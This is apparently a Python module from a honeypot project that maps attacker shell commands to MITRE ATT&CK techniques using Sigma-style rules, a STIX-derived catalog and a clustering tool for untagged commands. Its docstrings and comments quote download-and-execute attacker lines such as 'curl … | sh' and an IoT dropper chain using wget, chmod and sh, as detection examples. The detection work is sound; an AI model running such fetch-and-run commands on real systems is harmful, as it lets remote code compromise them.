"""
threat_intel/mitre_mapper.py — tag attacker commands with MITRE ATT&CK techniques.

Three clearly separated sources of truth:

  1. DETECTION (ours).  MITRE publishes the taxonomy, not a way to decide which
     technique a given shell command represents — no package does that. The
     rules therefore live in threat_intel/rules/**/*.yml, one file per rule, in
     a Sigma-style schema. They are written mechanism-first (match on what a
     command *does*), never on a hardcoded list of known-bad values.

  2. TAXONOMY (MITRE's).  Technique names and tactics come from MITRE's own
     enterprise-attack STIX bundle, distilled into mitre_catalog.json by
     build_catalog(). Never hand-typed, so they cannot drift.

  3. VALIDATION (Red Canary's).  validate_rules.py scores every rule against
     Atomic Red Team's Linux atomics, so each rule carries an external,
     reproducible precision/recall number instead of an assertion.

Why rules moved out of Python
-----------------------------
The previous version was an ordered regex list evaluated first-match-wins.
That had three defects this design removes:

  * only ever one technique per command, so `curl … | sh` reported execution
    and silently dropped the ingress-transfer tag;
  * precedence was an accident of list position, unauditable and unstated;
  * most rules were anchored with ^, so anything with a prefix
    (`cd /tmp && chmod 777 x`) missed entirely.

Now every rule is checked, precedence is a declared `priority:` integer, and
rules may match on `segment` (each part after splitting on && || ;) instead of
the whole line.

Usage
-----
    from threat_intel.mitre_mapper import tag, tag_all
    tag("wget http://x/y.sh")       # -> {'technique_id': 'T1105', ...}   primary only
    tag_all("curl http://x | sh")   # -> [T1059.004, T1105]               everything

CLI
---
    python threat_intel/mitre_mapper.py --build          regenerate the catalog
    python threat_intel/mitre_mapper.py --list           show loaded rules
    python threat_intel/mitre_mapper.py --discover       cluster untagged commands
    python threat_intel/mitre_mapper.py "<command>"      tag one command
"""

import functools
import json
import os
import re

_HERE = os.path.dirname(os.path.abspath(__file__))
STIX_PATH    = os.path.join(_HERE, "enterprise-attack.json")
CATALOG_PATH = os.path.join(_HERE, "mitre_catalog.json")
# Local Threat Intel Tier. The Global Community Tier (SigmaHQ) lives in
# rules/upstream/ and is loaded by threat_intel/sigma_import.py, which has a
# generic Sigma field engine; this module's engine matches command TEXT only,
# so it must not try to parse upstream rules.
RULES_DIR    = os.path.join(_HERE, "rules", "local_custom")
UPSTREAM_DIR = os.path.join(_HERE, "rules", "upstream")

# Split points for the `segment` field. Deliberately NOT the pipe: a pipeline
# is one semantic unit, and the pipe-to-shell rules need it intact.
_SEGMENT_SPLIT = re.compile(r"\s*(?:&&|\|\||;)\s*")


def segments(cmd: str) -> list:
    """Command split into independently-executed parts.

    `cd /tmp && chmod 777 x` -> ['cd /tmp', 'chmod 777 x'], so a rule anchored
    with ^ still fires on the second half. Pipelines are left whole.
    """
    return [s for s in (p.strip() for p in _SEGMENT_SPLIT.split(cmd or "")) if s]


# ══════════════════════════════════════════════════════════════════════════════
# SIGMA-SUBSET MATCHING
# ══════════════════════════════════════════════════════════════════════════════

class RuleError(ValueError):
    """A rule file is malformed. Raised at load time, never at match time."""


_SUPPORTED_FIELDS    = ("command", "segment")
_SUPPORTED_MODIFIERS = ("re", "contains", "startswith", "endswith", "all")


def _compile_matcher(field_expr: str, values):
    """Turn one `field|modifier: [values]` pair into a predicate over ctx."""
    parts = field_expr.split("|")
    field, mods = parts[0], parts[1:]

    if field not in _SUPPORTED_FIELDS:
        raise RuleError(f"unsupported field {field!r} "
                        f"(supported: {', '.join(_SUPPORTED_FIELDS)})")
    for m in mods:
        if m not in _SUPPORTED_MODIFIERS:
            raise RuleError(f"unsupported modifier {m!r} in {field_expr!r}")

    if not isinstance(values, list):
        values = [values]
    values = [str(v) for v in values]

    require_all = "all" in mods          # `contains|all` -> every value must hit

    if "re" in mods:
        try:
            pats = [re.compile(v, re.I) for v in values]
        except re.error as e:
            raise RuleError(f"bad regex in {field_expr!r}: {e}") from e
        test = lambda s, p: p.search(s) is not None
    elif "contains" in mods:
        pats = [v.lower() for v in values]
        test = lambda s, p: p in s.lower()
    elif "startswith" in mods:
        pats = [v.lower() for v in values]
        test = lambda s, p: s.lower().startswith(p)
    elif "endswith" in mods:
        pats = [v.lower() for v in values]
        test = lambda s, p: s.lower().endswith(p)
    else:                                 # no modifier -> exact, case-insensitive
        pats = [v.lower() for v in values]
        test = lambda s, p: s.lower() == p

    def predicate(ctx):
        # `command` tests the whole line; `segment` succeeds if ANY segment hits
        haystacks = [ctx["command"]] if field == "command" else ctx["segments"]
        agg = all if require_all else any
        return agg(any(test(h, p) for h in haystacks) for p in pats)

    return predicate


def _compile_selection(name: str, block):
    """A selection maps field->values; all fields must match (AND)."""
    if not isinstance(block, dict):
        raise RuleError(f"selection {name!r} must be a mapping")
    preds = [_compile_matcher(f, v) for f, v in block.items()]
    return lambda ctx: all(p(ctx) for p in preds)


# ── condition grammar ────────────────────────────────────────────────────────
#   expr   := term ('or' term)*
#   term   := factor ('and' factor)*
#   factor := 'not' factor | '(' expr ')' | agg | identifier
#   agg    := ('1' | 'any' | 'all') 'of' pattern
_COND_TOKEN = re.compile(r"\(|\)|\b(?:and|or|not|of|all|any|1)\b|[A-Za-z_][\w*]*")


def _compile_condition(expr: str, selections: dict):
    tokens = _COND_TOKEN.findall(expr or "")
    if not tokens:
        raise RuleError(f"empty condition {expr!r}")
    pos = 0

    def peek():
        return tokens[pos] if pos < len(tokens) else None

    def eat(expected=None):
        nonlocal pos
        tok = peek()
        if tok is None or (expected and tok != expected):
            raise RuleError(f"condition {expr!r}: expected {expected!r}, got {tok!r}")
        pos += 1
        return tok

    def resolve(pattern):
        if pattern.endswith("*"):
            pre = pattern[:-1]
            names = [n for n in selections if n.startswith(pre)]
        else:
            names = [pattern] if pattern in selections else []
        if not names:
            raise RuleError(f"condition {expr!r}: no selection matches {pattern!r}")
        return [selections[n] for n in names]

    def parse_factor():
        tok = peek()
        if tok == "not":
            eat("not")
            inner = parse_factor()
            return lambda ctx: not inner(ctx)
        if tok == "(":
            eat("(")
            inner = parse_expr()
            eat(")")
            return inner
        if tok in ("1", "any", "all"):
            quant = eat()
            eat("of")
            preds = resolve(eat())
            agg = all if quant == "all" else any
            return lambda ctx: agg(p(ctx) for p in preds)
        name = eat()
        preds = resolve(name)
        return lambda ctx: any(p(ctx) for p in preds)

    def parse_term():
        node = parse_factor()
        while peek() == "and":
            eat("and")
            rhs = parse_factor()
            prev = node
            node = lambda ctx, a=prev, b=rhs: a(ctx) and b(ctx)
        return node

    def parse_expr():
        node = parse_term()
        while peek() == "or":
            eat("or")
            rhs = parse_term()
            prev = node
            node = lambda ctx, a=prev, b=rhs: a(ctx) or b(ctx)
        return node

    tree = parse_expr()
    if pos != len(tokens):
        raise RuleError(f"condition {expr!r}: trailing tokens {tokens[pos:]}")
    return tree


# ══════════════════════════════════════════════════════════════════════════════
# RULE LOADING
# ══════════════════════════════════════════════════════════════════════════════

_CONFIDENCE_ORDER = {"high": 0, "medium": 1, "low": 2}
_REQUIRED = ("id", "title", "technique", "tactic", "detection")


class Rule:
    __slots__ = ("id", "title", "technique", "technique_name", "tactic",
                 "priority", "confidence", "status", "tags", "path", "_match")

    def __init__(self, doc: dict, path: str):
        missing = [k for k in _REQUIRED if k not in doc]
        if missing:
            raise RuleError(f"missing required key(s): {', '.join(missing)}")

        self.path           = path
        self.id             = str(doc["id"])
        self.title          = str(doc["title"])
        self.technique      = str(doc["technique"])
        self.technique_name = doc.get("technique_name")
        self.tactic         = doc.get("tactic")
        self.status         = doc.get("status", "experimental")
        self.tags           = doc.get("tags") or []
        self.confidence     = str(doc.get("confidence", "medium")).lower()
        if self.confidence not in _CONFIDENCE_ORDER:
            raise RuleError(f"confidence must be low/medium/high, got {self.confidence!r}")
        try:
            self.priority = int(doc.get("priority", 50))
        except (TypeError, ValueError):
            raise RuleError(f"priority must be an integer, got {doc.get('priority')!r}")

        detection = dict(doc["detection"])
        condition = detection.pop("condition", None)
        if not condition:
            raise RuleError("detection block has no 'condition'")
        selections = {n: _compile_selection(n, b) for n, b in detection.items()}
        if not selections:
            raise RuleError("detection block has no selections")
        self._match = _compile_condition(str(condition), selections)

    def matches(self, ctx) -> bool:
        return self._match(ctx)

    def __repr__(self):
        return f"<Rule {self.technique} {self.title!r} p={self.priority} {self.confidence}>"


_rules = None
_load_errors = []


def load_rules(rules_dir: str = RULES_DIR, force: bool = False) -> list:
    """Load and compile every rule file. Cached after the first call.

    A malformed rule is skipped with a warning rather than taking the honeypot
    down — but the error is retained in load_errors() so --list and the
    validator can report it.
    """
    global _rules, _load_errors
    if _rules is not None and not force:
        return _rules

    import yaml

    found, errors = [], []
    for root, _dirs, files in os.walk(rules_dir):
        for fn in sorted(files):
            if not fn.endswith((".yml", ".yaml")):
                continue
            path = os.path.join(root, fn)
            try:
                with open(path, encoding="utf-8") as f:
                    doc = yaml.safe_load(f)
                if not isinstance(doc, dict):
                    raise RuleError("file is not a YAML mapping")
                found.append(Rule(doc, path))
            except Exception as e:
                rel = os.path.relpath(path, rules_dir)
                errors.append((rel, str(e)))
                print(f"[mitre] skipping rule {rel}: {e}")

    seen = {}
    for r in found:
        if r.id in seen:
            errors.append((os.path.relpath(r.path, rules_dir),
                           f"duplicate rule id, also used by {seen[r.id]}"))
            print(f"[mitre] WARNING: duplicate rule id {r.id}")
        seen[r.id] = os.path.relpath(r.path, rules_dir)

    # primary-tag order: explicit priority, then confidence, then technique id
    found.sort(key=lambda r: (r.priority, _CONFIDENCE_ORDER[r.confidence], r.technique))
    _rules, _load_errors = found, errors
    return _rules


def load_errors() -> list:
    load_rules()
    return list(_load_errors)


# ══════════════════════════════════════════════════════════════════════════════
# MATCHING
# ══════════════════════════════════════════════════════════════════════════════

# Command-path indirection: the same binary can be invoked as `chmod`,
# `/bin/chmod`, or `/bin/busybox chmod`. IoT droppers overwhelmingly use the
# busybox form — 726 commands in this corpus ran `/bin/busybox chmod 777 <x>`
# at FI 4 and went untagged, because every ^-anchored rule saw "/bin/busybox".
# Rather than teach each rule about busybox (a value list that would rot), each
# segment is also offered to the matcher with the wrapper and the directory
# prefix removed, so `^\s*chmod` fires on all three spellings.
_BUSYBOX_WRAPPER = re.compile(r"^(?:\S*/)?busybox\s+", re.I)
_PATH_QUALIFIED  = re.compile(r"^/\S*/(?=[\w.+-]+(?:\s|$))")


def _segment_variants(seg: str) -> list:
    out = [seg]
    stripped = _BUSYBOX_WRAPPER.sub("", seg, count=1)
    if stripped != seg:
        out.append(stripped)
    basename = _PATH_QUALIFIED.sub("", stripped, count=1)
    if basename != stripped:
        out.append(basename)
    return out


def _context(cmd: str) -> dict:
    s = (cmd or "").strip()
    segs = segments(s) or [s]
    expanded = []
    for seg in segs:
        expanded.extend(_segment_variants(seg))
    return {"command": s, "segments": expanded}


def match_rules(cmd: str) -> list:
    """Every Rule whose condition holds, best-primary first. Never truncated."""
    if not cmd or not cmd.strip():
        return []
    ctx = _context(cmd)
    return [r for r in load_rules() if r.matches(ctx)]


def classify_all(cmd: str) -> list:
    """Distinct technique IDs for `cmd`, best-primary first."""
    return list(dict.fromkeys(r.technique for r in match_rules(cmd)))


def classify(cmd: str):
    """Primary technique_id, or None. Kept for backward compatibility."""
    hits = classify_all(cmd)
    return hits[0] if hits else None


# ── TAXONOMY (MITRE's) ────────────────────────────────────────────────────────

_catalog = None


def _load_catalog() -> dict:
    global _catalog
    if _catalog is None:
        try:
            with open(CATALOG_PATH, encoding="utf-8") as f:
                _catalog = json.load(f)
        except Exception:
            _catalog = {}
    return _catalog


def _describe(rule: Rule) -> dict:
    """Technique name/tactic for a rule: catalog first (regenerated from MITRE),
    falling back to the values baked into the rule file when the catalog is
    stale or missing, so a tag never degrades to a bare ID."""
    meta = _load_catalog().get(rule.technique, {})
    return {
        "technique_id": rule.technique,
        "technique":    meta.get("name")   or rule.technique_name,
        "tactic":       meta.get("tactic") or rule.tactic,
    }


# ── priority pipeline: SigmaHQ upstream first, local custom as fallback ──────
_UPSTREAM_ENABLED = True


@functools.lru_cache(maxsize=8192)
def _upstream_cached(cmd: str) -> tuple:
    try:
        from threat_intel import sigma_import
        return tuple(tuple(sorted(h.items(), key=lambda kv: kv[0]))
                     for h in sigma_import.classify_command(cmd))
    except Exception:
        return ()


def _upstream(cmd: str) -> list:
    """SigmaHQ (rules/upstream/) hits for `cmd`, or [] .

    Imported lazily: sigma_import imports _compile_condition from this module,
    so a module-level import would be circular. Any failure degrades to the
    local tier rather than taking tagging down.
    """
    if not _UPSTREAM_ENABLED:
        return []
    # Attacker commands repeat heavily (132k rows, 4.3k unique), so memoising
    # the 180-rule upstream sweep is the difference between 1 ms and ~0 per
    # repeat hit. Cached as tuples because lru_cache needs hashable returns.
    return [dict(h) for h in _upstream_cached(cmd)]


def _describe_upstream(hit: dict) -> dict:
    """Upstream rules carry a technique ID but no name/tactic, so resolve those
    from the MITRE catalog. Falls back to the Sigma tactic tag when the catalog
    has not been rebuilt for that technique yet."""
    tid = hit["technique_id"]
    meta = _load_catalog().get(tid, {})
    tactic = meta.get("tactic")
    if not tactic and hit.get("tactics"):
        tactic = hit["tactics"][0].replace("-", " ").title()
    return {"technique_id": tid,
            "technique": meta.get("name") or tid,
            "tactic": tactic or ""}


def tag(cmd: str):
    """Primary tag: {technique_id, technique, tactic} or None.

    Priority pipeline:
      1. rules/upstream/     SigmaHQ community rules  (preferred - auditable,
                             vendor-agnostic, not authored here)
      2. rules/local_custom/ HydraPoT rules, only when upstream finds nothing.
                             These carry the heavy honeypot traffic (ls, top,
                             nproc, chmod ...) that SigmaHQ has no rule for.

    Return shape is unchanged - exactly {technique_id, technique, tactic} - so
    main.py's session/SIEM events and dashboard.py's per-command lookup keep
    working, and storage.py's fixed column list is unaffected.
    """
    up = _upstream(cmd)
    if up:
        return _describe_upstream(up[0])
    hits = match_rules(cmd)
    return _describe(hits[0]) if hits else None


def tag_all(cmd: str) -> list:
    """Every technique for `cmd`, best-primary first, one entry per technique.

    Each entry carries the rule that produced it, so a surprising tag on the
    dashboard can be traced straight back to a file.

    UNION, not fallback. Upstream (SigmaHQ) entries come first so the dashboard
    leads with community-authored attribution, then every local technique not
    already present is appended. tag() keeps strict upstream-first priority for
    its single primary tag, so main.py's contract is unchanged.

    Why this is a union: validate_traffic.py caught the fallback version losing
    most of an attack chain. On the IoT dropper line
        cd /tmp || ...; wget http://…/njs.sh; chmod +x njs.sh; sh njs.sh; tftp …
    upstream matches only T1070.003, while the local tier finds T1070.003,
    T1105, T1059.004, T1222.002 and T1070.004. Returning on the first upstream
    hit reported 1 technique out of 5 and hid the download, the permission
    change, the execution and the cleanup.
    """
    out, seen = [], set()
    for h in _upstream(cmd):
        if h["technique_id"] in seen:
            continue
        seen.add(h["technique_id"])
        out.append({**_describe_upstream(h), "confidence": h.get("level") or "",
                    "priority": 0, "rule_id": h["rule_id"],
                    "rule_title": h["rule_title"], "source": "sigmahq"})
    for r in match_rules(cmd):
        if r.technique in seen:
            continue
        seen.add(r.technique)
        out.append({**_describe(r), "confidence": r.confidence,
                    "priority": r.priority, "rule_id": r.id,
                    "rule_title": r.title, "source": "local_custom"})
    return out


# ══════════════════════════════════════════════════════════════════════════════
# CATALOG BUILD
# ══════════════════════════════════════════════════════════════════════════════

def build_catalog(stix_path: str = STIX_PATH, out_path: str = CATALOG_PATH) -> dict:
    """Distill the techniques the rules use out of the official STIX bundle.

    Run after adding or retargeting a rule. Keeps the honeypot's runtime cost to
    a small JSON read instead of parsing a 46 MB bundle on every start.

    Tactic display names are taken from MITRE's own x-mitre-tactic objects. The
    previous version derived them with .replace('-',' ').title(), which produced
    "Command And Control" where MITRE's name is "Command and Control" — enough
    to break tactic matching in a downstream SIEM.
    """
    wanted = {r.technique for r in load_rules()}
    try:                                  # include the upstream tier's techniques
        from threat_intel import sigma_import
        wanted |= {t for r in sigma_import.load()[0] for t in r.techniques}
    except Exception as e:
        print(f"[mitre] upstream techniques unavailable for catalog: {e}")
    if not wanted:
        raise RuleError(f"no rules loaded from {RULES_DIR}; nothing to build")

    with open(stix_path, encoding="utf-8") as f:
        bundle = json.load(f)

    short2name = {o["x_mitre_shortname"]: o["name"]
                  for o in bundle["objects"] if o.get("type") == "x-mitre-tactic"}

    by_id = {}
    for o in bundle["objects"]:
        if o.get("type") != "attack-pattern":
            continue
        if o.get("revoked") or o.get("x_mitre_deprecated"):
            continue
        ext = next((r for r in o.get("external_references", [])
                    if r.get("source_name") == "mitre-attack"), None)
        if not ext or ext.get("external_id") not in wanted:
            continue
        phases = [p["phase_name"] for p in o.get("kill_chain_phases", [])
                  if p.get("kill_chain_name") == "mitre-attack"]
        tactics = [short2name.get(p, p) for p in phases]
        by_id[ext["external_id"]] = {
            "name": o["name"],
            # a technique can belong to several tactics; keep the first for the
            # dashboard's single-tactic grouping, all of them for detail
            "tactic": tactics[0] if tactics else None,
            "tactics": tactics,
            "url": ext.get("url"),
        }

    missing = sorted(wanted - set(by_id))
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(by_id, f, indent=2, ensure_ascii=False, sort_keys=True)

    print(f"[mitre] catalog written -> {out_path} ({len(by_id)}/{len(wanted)} techniques)")
    if missing:
        print(f"[mitre] WARNING: not found in STIX (typo or revoked?): {missing}")
    return by_id


# ══════════════════════════════════════════════════════════════════════════════
# DISCOVERY — surface recurring commands no rule covers
# ══════════════════════════════════════════════════════════════════════════════

_NORM = [
    (re.compile(r"https?://\S+"),                      "<URL>"),
    (re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),       "<IP>"),
    (re.compile(r"\b[a-fA-F0-9]{16,}\b"),              "<HEX>"),
    (re.compile(r"\b\d+\b"),                           "<N>"),
    (re.compile(r"/[\w./+-]+"),                        "<PATH>"),
    (re.compile(r"\s+"),                               " "),
]


def normalise(cmd: str) -> str:
    """Reduce a command to its mechanism shape so variants cluster together.

    Values (hosts, paths, hashes, ports) become placeholders; the verbs and
    operators that decide *what the command does* survive. This is what keeps
    discovery mechanism-based rather than turning it into a list of known-bad
    strings.
    """
    s = (cmd or "").strip()
    for rx, repl in _NORM:
        s = rx.sub(repl, s)
    return s.strip()


def discover(limit: int = 40, min_count: int = 2, rows=None) -> list:
    """Cluster untagged commands from the honeypot corpus, ranked by
    frequency x severity, so the biggest blind spots surface first.

    Returns a list of dicts; the CLI prints them. Reads SQLite by default.
    """
    if rows is None:
        import sys
        sys.path.insert(0, os.path.dirname(_HERE))
        import storage
        rows = storage.query_all_df().to_dict("records")

    clusters = {}
    for r in rows:
        cmd = (r.get("cmd") or "").strip()
        if not cmd or classify(cmd):
            continue
        key = normalise(cmd)
        c = clusters.setdefault(key, {"shape": key, "count": 0, "max_fi": 0,
                                      "examples": []})
        c["count"] += 1
        c["max_fi"] = max(c["max_fi"], int(r.get("fi_score") or 0))
        if len(c["examples"]) < 3 and cmd not in c["examples"]:
            c["examples"].append(cmd)

    out = [c for c in clusters.values() if c["count"] >= min_count]
    # severity-weighted frequency: a rare FI-4 blind spot outranks common noise
    for c in out:
        c["score"] = c["count"] * (1 + c["max_fi"])
    out.sort(key=lambda c: -c["score"])
    return out[:limit]


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def _cli_list():
    rules = load_rules()
    print(f"{len(rules)} rules loaded from {RULES_DIR}\n")
    print(f"  {'PRIO':>4}  {'TECHNIQUE':<12} {'CONF':<7} {'TACTIC':<22} TITLE")
    for r in rules:
        print(f"  {r.priority:>4}  {r.technique:<12} {r.confidence:<7} "
              f"{str(r.tactic):<22} {r.title}")
    errs = load_errors()
    if errs:
        print(f"\n{len(errs)} rule file(s) failed to load:")
        for rel, msg in errs:
            print(f"  {rel}: {msg}")


def _cli_discover():
    clusters = discover()
    print(f"top {len(clusters)} untagged command shapes "
          f"(score = count x (1 + max_fi))\n")
    for c in clusters:
        print(f"  score {c['score']:>7}  n={c['count']:<6} maxFI={c['max_fi']}  {c['shape'][:76]}")
        for ex in c["examples"][:2]:
            print(f"        e.g. {ex[:90]}")
    print("\nWrite a rule for any shape that represents a real technique, "
          "then re-run --build.")


if __name__ == "__main__":
    import sys
    args = sys.argv[1:]
    if "--build" in args:
        build_catalog()
    elif "--list" in args:
        _cli_list()
    elif "--discover" in args:
        _cli_discover()
    elif args:
        for c in args:
            hits = tag_all(c)
            print(f"\n{c!r}")
            if not hits:
                print("   (untagged)")
            for h in hits:
                print(f"   {h['technique_id']:<12} {h['confidence']:<7} "
                      f"{h['technique']} [{h['tactic']}]  <- {h['rule_title']}")
    else:
        print(__doc__)
